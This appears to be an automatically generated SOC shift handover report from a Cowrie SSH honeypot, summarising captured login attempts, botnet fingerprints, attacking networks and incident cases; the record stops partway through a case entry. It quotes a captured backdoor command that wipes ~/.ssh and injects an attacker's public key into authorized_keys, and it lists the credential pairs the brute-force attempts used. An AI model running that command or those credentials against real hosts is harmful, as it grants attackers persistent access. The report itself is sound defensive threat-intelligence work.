# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-02 |
| **Generated At** | 2026-07-02T10:45:27Z |
| **Shift Time** | 10:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **135** |
| Confirmed Threats | **131** |
| False Positives Filtered | **4** (3.0%) |
| Unique Attacker IPs | **35** |
| Countries of Origin | **14** |
| High Severity Cases | **61** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **74** |
| Malware Samples Analyzed | **4** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **82** |
| Unique Credential Pairs | **44** |
| Unique Usernames | **15** |
| Unique Passwords | **41** |
| Successful Auth Pairs | **64** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 39 |
| `345gs5662d34` | 11 |
| `admin` | 11 |
| `ubuntu` | 9 |
| `test` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 11 |
| `admin` | 8 |
| `LeitboGi0ro` | 5 |
| `smo@@kkklss` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `3245gs5662d34` | 9 |
| `admin` | `admin` | 8 |
| `root` | `LeitboGi0ro` | 5 |
| `root` | `smo@@kkklss` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Jj123456.` | `10.0.0.73` | 2026-07-02T06:55:07 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-02T06:55:10 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T06:55:10 |
| `root` | `abc@2025` | `114.29.11.190` | 2026-07-02T06:55:35 |
| `345gs5662d34` | `345gs5662d34` | `114.29.11.190` | 2026-07-02T06:55:39 |
| `root` | `3245gs5662d34` | `114.29.11.190` | 2026-07-02T06:55:40 |
| `admin` | `admin` | `45.148.10.121` | 2026-07-02T06:55:52 |
| `root` | `qq1234567` | `10.0.0.73` | 2026-07-02T06:59:34 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-02T07:02:27 |
| `root` | `Root@` | `45.205.1.42` | 2026-07-02T07:03:20 |
| `ubuntu` | `123abc` | `45.198.224.120` | 2026-07-02T07:04:30 |
| `ubuntu` | `ubuntu` | `112.53.123.118` | 2026-07-02T07:05:09 |
| `GET http://146.56.180.42:3333/ HTTP/1.1` | `Host: 146.56.180.42:3333` | `94.154.43.36` | 2026-07-02T07:13:22 |
| `ubuntu` | `password201` | `185.242.3.195` | 2026-07-02T07:16:08 |
| `ubuntu` | `a1b2c3` | `45.198.224.120` | 2026-07-02T07:16:17 |
| `root` | `147258` | `45.205.1.42` | 2026-07-02T07:17:36 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-02T07:26:09 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-02T07:26:09 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-02T07:26:11 |
| `root` | `linux` | `45.198.224.120` | 2026-07-02T07:27:56 |
| `oracle` | `333333` | `45.205.1.42` | 2026-07-02T07:31:28 |
| `test` | `999` | `186.68.83.104` | 2026-07-02T07:32:32 |
| `345gs5662d34` | `345gs5662d34` | `186.68.83.104` | 2026-07-02T07:32:34 |
| `test` | `3245gs5662d34` | `186.68.83.104` | 2026-07-02T07:32:35 |
| `root` | `ROsLNa1O&#039;ZHGNOI` | `45.198.224.120` | 2026-07-02T07:39:19 |
| `root` | `qazWSX123!@#` | `45.205.1.42` | 2026-07-02T07:45:27 |
| `ubuntu` | `3333333333` | `45.198.224.120` | 2026-07-02T07:51:00 |
| `ubuntu` | `password201` | `10.0.0.73` | 2026-07-02T07:56:32 |
| `root` | `qazqwe!#%&` | `45.205.1.42` | 2026-07-02T07:59:24 |
| `ubuntu` | `P@55w0rd!` | `45.198.224.120` | 2026-07-02T08:02:43 |
| `root` | `liverpool` | `45.205.1.42` | 2026-07-02T08:13:21 |
| `admin` | `password` | `45.198.224.120` | 2026-07-02T08:14:12 |
| `root` | `aA@12345` | `10.0.0.73` | 2026-07-02T08:17:44 |
| `root` | `Ideal@123` | `10.0.0.73` | 2026-07-02T08:17:47 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.156.17.76` | 2026-07-02T08:20:13 |
| `*1` | `$4` | `34.156.17.76` | 2026-07-02T08:20:22 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 3831` | `34.156.17.76` | 2026-07-02T08:20:24 |
| `admin` | `root` | `171.244.63.18` | 2026-07-02T08:20:40 |
| `345gs5662d34` | `345gs5662d34` | `171.244.63.18` | 2026-07-02T08:20:44 |
| `admin` | `3245gs5662d34` | `171.244.63.18` | 2026-07-02T08:20:46 |
| `root` | `P4$$W0rd` | `20.124.91.101` | 2026-07-02T08:23:34 |
| `345gs5662d34` | `345gs5662d34` | `20.124.91.101` | 2026-07-02T08:23:36 |
| `root` | `3245gs5662d34` | `20.124.91.101` | 2026-07-02T08:23:36 |
| `root` | `hello@1234` | `103.190.214.241` | 2026-07-02T08:24:19 |
| `345gs5662d34` | `345gs5662d34` | `103.190.214.241` | 2026-07-02T08:24:23 |
| `root` | `3245gs5662d34` | `103.190.214.241` | 2026-07-02T08:24:24 |
| `webadmin` | `webadmin` | `45.198.224.120` | 2026-07-02T08:25:13 |
| `inspur` | `inspur` | `45.205.1.42` | 2026-07-02T08:27:23 |
| `root` | `87654321` | `161.132.54.218` | 2026-07-02T08:29:35 |
| `345gs5662d34` | `345gs5662d34` | `161.132.54.218` | 2026-07-02T08:29:38 |
| `root` | `3245gs5662d34` | `161.132.54.218` | 2026-07-02T08:29:38 |
| `root` | `P4$$W0rd` | `217.216.111.63` | 2026-07-02T08:31:47 |
| `345gs5662d34` | `345gs5662d34` | `217.216.111.63` | 2026-07-02T08:31:51 |
| `root` | `3245gs5662d34` | `217.216.111.63` | 2026-07-02T08:31:53 |
| `madison` | `madison` | `45.198.224.120` | 2026-07-02T08:36:14 |
| `a` | `a` | `10.0.0.73` | 2026-07-02T08:38:24 |
| `ubuntu` | `qazwsx` | `45.205.1.42` | 2026-07-02T08:41:30 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-02T08:42:15 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-02T08:42:17 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-02T08:42:19 |
| `root` | `123@@@` | `146.56.164.20` | 2026-07-02T08:42:34 |
| `root` | `LeitboGi0ro` | `146.56.164.20` | 2026-07-02T08:42:34 |
| `root` | `ubuntu` | `45.198.224.120` | 2026-07-02T08:47:20 |
| `git` | `git!@#` | `185.242.3.195` | 2026-07-02T08:48:36 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **135** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 27 |
| libssh | 22 |
| Paramiko (Python) | 12 |
| Unknown | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 21 | 3 |
| `f555226df196...` | Mirai/variant | 18 | 6 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |
| `03a80b21afa8...` | Modern SSH client | 4 | 2 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 21 | 3 | Generic scanner |
| `f555226df196...` | libssh | 18 | 6 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `03a80b21afa8...` | libssh | 4 | 2 | Modern SSH client |
| `95420f9d932d...` | Unknown | 4 | 4 | — |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `bf7dbf67fa9b...` | Go SSH scanner | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `161.132.54.218`, `103.190.214.241`, `114.29.11.190`, `20.124.91.101`, `186.68.83.104`, `217.216.111.63`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **35** |
| Unique ASNs | **25** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS12552` | GlobalConnect AB | 2 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (61)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1d94c6cc2934

| Field | Detail |
|---|---|
| **Source IP** | `114.29.11[.]190` |
| **First Seen** | 2026-07-02 06:55 |
| **Last Seen** | 2026-07-02 06:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:55:34` | `cowrie.session.connect` |
| `2026-07-02 06:55:34` | `cowrie.client.version` |
| `2026-07-02 06:55:35` | `cowrie.client.kex` |
| `2026-07-02 06:55:35` | `cowrie.login.success` |
| `2026-07-02 06:55:36` | `cowrie.session.params` |
| `2026-07-02 06:55:36` | `cowrie.command.input` |
| `2026-07-02 06:55:36` | `cowrie.command.failed` |
| `2026-07-02 06:55:36` | `cowrie.log.closed` |
| `2026-07-02 06:55:38` | `cowrie.session.params` |
| `2026-07-02 06:55:38` | `cowrie.command.input` |
| `2026-07-02 06:55:38` | `cowrie.session.file_download` |
| `2026-07-02 06:55:38` | `cowrie.log.closed` |
| `2026-07-02 06:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.29.11[.]190` to AbuseIPDB if not already reported
- [ ] Block `114.29.11[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04e769f73a39

| Field | Detail |
|---|---|
| **Source IP** | `114.29.11[.]190` |
| **First Seen** | 2026-07-02 06:55 |
| **Last Seen** | 2026-07-02 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:55:38` | `cowrie.session.connect` |
| `2026-07-02 06:55:38` | `cowrie.client.version` |
| `2026-07-02 06:55:38` | `cowrie.client.kex` |
| `2026-07-02 06:55:39` | `cowrie.login.success` |
| `2026-07-02 06:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.29.11[.]190` to AbuseIPDB if not already reported
- [ ] Block `114.29.11[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f0af65efadb

| Field | Detail |
|---|---|
| **Source IP** | `114.29.11[.]190` |
| **First Seen** | 2026-07-02 06:55 |
| **Last Seen** | 2026-07-02 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:55:39` | `cowrie.session.connect` |
| `2026-07-02 06:55:39` | `cowrie.client.version` |
| `2026-07-02 06:55:40` | `cowrie.client.kex` |
| `2026-07-02 06:55:40` | `cowrie.login.success` |
| `2026-07-02 06:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.29.11[.]190` to AbuseIPDB if not already reported
- [ ] Block `114.29.11[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a5320e0ba38

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-02 06:55 |
| **Last Seen** | 2026-07-02 06:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:55:51` | `cowrie.session.connect` |
| `2026-07-02 06:55:51` | `cowrie.client.version` |
| `2026-07-02 06:55:51` | `cowrie.client.kex` |
| `2026-07-02 06:55:52` | `cowrie.login.success` |
| `2026-07-02 06:55:52` | `cowrie.direct-tcpip.request` |
| `2026-07-02 06:55:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-02 06:55:52` | `cowrie.direct-tcpip.data` |
| `2026-07-02 06:55:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd4150c0fd72

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-02 06:55 |
| **Last Seen** | 2026-07-02 06:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:55:52` | `cowrie.session.connect` |
| `2026-07-02 06:55:52` | `cowrie.client.version` |
| `2026-07-02 06:55:52` | `cowrie.client.kex` |
| `2026-07-02 06:55:53` | `cowrie.login.success` |
| `2026-07-02 06:55:53` | `cowrie.direct-tcpip.request` |
| `2026-07-02 06:55:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-02 06:55:53` | `cowrie.direct-tcpip.data` |
| `2026-07-02 06:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b52a6ff6483

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 07:03 |
| **Last Seen** | 2026-07-02 07:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:03:18` | `cowrie.session.connect` |
| `2026-07-02 07:03:19` | `cowrie.client.version` |
| `2026-07-02 07:03:19` | `cowrie.client.kex` |
| `2026-07-02 07:03:20` | `cowrie.login.success` |
| `2026-07-02 07:03:21` | `cowrie.session.params` |
| `2026-07-02 07:03:21` | `cowrie.command.input` |
| `2026-07-02 07:03:22` | `cowrie.log.closed` |
| `2026-07-02 07:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e61bca5357cd

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 07:04 |
| **Last Seen** | 2026-07-02 07:04 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:04:22` | `cowrie.session.connect` |
| `2026-07-02 07:04:24` | `cowrie.client.version` |
| `2026-07-02 07:04:24` | `cowrie.client.kex` |
| `2026-07-02 07:04:30` | `cowrie.login.success` |
| `2026-07-02 07:04:33` | `cowrie.session.params` |
| `2026-07-02 07:04:33` | `cowrie.command.input` |
| `2026-07-02 07:04:37` | `cowrie.log.closed` |
| `2026-07-02 07:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98eb0c205640

| Field | Detail |
|---|---|
| **Source IP** | `112.53.123[.]118` |
| **First Seen** | 2026-07-02 07:05 |
| **Last Seen** | 2026-07-02 07:05 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:05:08` | `cowrie.session.connect` |
| `2026-07-02 07:05:08` | `cowrie.client.version` |
| `2026-07-02 07:05:08` | `cowrie.client.kex` |
| `2026-07-02 07:05:09` | `cowrie.login.success` |
| `2026-07-02 07:05:10` | `cowrie.client.size` |
| `2026-07-02 07:05:11` | `cowrie.session.params` |
| `2026-07-02 07:05:20` | `cowrie.log.closed` |
| `2026-07-02 07:05:22` | `cowrie.session.params` |
| `2026-07-02 07:05:22` | `cowrie.command.input` |
| `2026-07-02 07:05:22` | `cowrie.log.closed` |
| `2026-07-02 07:05:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.53.123[.]118` to AbuseIPDB if not already reported
- [ ] Block `112.53.123[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03601595bb95

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]36` |
| **First Seen** | 2026-07-02 07:13 |
| **Last Seen** | 2026-07-02 07:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36, Accept: */*, Connection: close, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:13:22` | `cowrie.session.connect` |
| `2026-07-02 07:13:22` | `cowrie.login.success` |
| `2026-07-02 07:13:23` | `cowrie.session.params` |
| `2026-07-02 07:13:23` | `cowrie.command.input` |
| `2026-07-02 07:13:23` | `cowrie.command.input` |
| `2026-07-02 07:13:23` | `cowrie.command.failed` |
| `2026-07-02 07:13:23` | `cowrie.command.input` |
| `2026-07-02 07:13:23` | `cowrie.command.failed` |
| `2026-07-02 07:13:23` | `cowrie.command.input` |
| `2026-07-02 07:13:23` | `cowrie.command.failed` |
| `2026-07-02 07:13:23` | `cowrie.command.input` |
| `2026-07-02 07:13:23` | `cowrie.log.closed` |
| `2026-07-02 07:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]36` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d08d217e33b0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 07:16 |
| **Last Seen** | 2026-07-02 07:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:16:07` | `cowrie.session.connect` |
| `2026-07-02 07:16:07` | `cowrie.client.version` |
| `2026-07-02 07:16:07` | `cowrie.client.kex` |
| `2026-07-02 07:16:08` | `cowrie.login.success` |
| `2026-07-02 07:16:09` | `cowrie.session.params` |
| `2026-07-02 07:16:09` | `cowrie.command.input` |
| `2026-07-02 07:16:09` | `cowrie.log.closed` |
| `2026-07-02 07:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e4d1b5e317f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 07:16 |
| **Last Seen** | 2026-07-02 07:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:16:10` | `cowrie.session.connect` |
| `2026-07-02 07:16:11` | `cowrie.client.version` |
| `2026-07-02 07:16:11` | `cowrie.client.kex` |
| `2026-07-02 07:16:17` | `cowrie.login.success` |
| `2026-07-02 07:16:20` | `cowrie.session.params` |
| `2026-07-02 07:16:20` | `cowrie.command.input` |
| `2026-07-02 07:16:21` | `cowrie.log.closed` |
| `2026-07-02 07:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26e5469886b5

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 07:17 |
| **Last Seen** | 2026-07-02 07:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:17:34` | `cowrie.session.connect` |
| `2026-07-02 07:17:34` | `cowrie.client.version` |
| `2026-07-02 07:17:34` | `cowrie.client.kex` |
| `2026-07-02 07:17:36` | `cowrie.login.success` |
| `2026-07-02 07:17:38` | `cowrie.session.params` |
| `2026-07-02 07:17:38` | `cowrie.command.input` |
| `2026-07-02 07:17:38` | `cowrie.log.closed` |
| `2026-07-02 07:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae62bc98a8f6

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 07:26 |
| **Last Seen** | 2026-07-02 07:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:26:08` | `cowrie.session.connect` |
| `2026-07-02 07:26:08` | `cowrie.client.version` |
| `2026-07-02 07:26:08` | `cowrie.client.kex` |
| `2026-07-02 07:26:09` | `cowrie.login.success` |
| `2026-07-02 07:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f7ad4b41cd

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 07:26 |
| **Last Seen** | 2026-07-02 07:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:26:08` | `cowrie.session.connect` |
| `2026-07-02 07:26:08` | `cowrie.client.version` |
| `2026-07-02 07:26:08` | `cowrie.client.kex` |
| `2026-07-02 07:26:09` | `cowrie.login.success` |
| `2026-07-02 07:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747aecddd1a2

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 07:26 |
| **Last Seen** | 2026-07-02 07:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:26:11` | `cowrie.session.connect` |
| `2026-07-02 07:26:11` | `cowrie.client.version` |
| `2026-07-02 07:26:11` | `cowrie.client.kex` |
| `2026-07-02 07:26:11` | `cowrie.login.success` |
| `2026-07-02 07:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd29bb217e93

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 07:26 |
| **Last Seen** | 2026-07-02 07:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:26:12` | `cowrie.session.connect` |
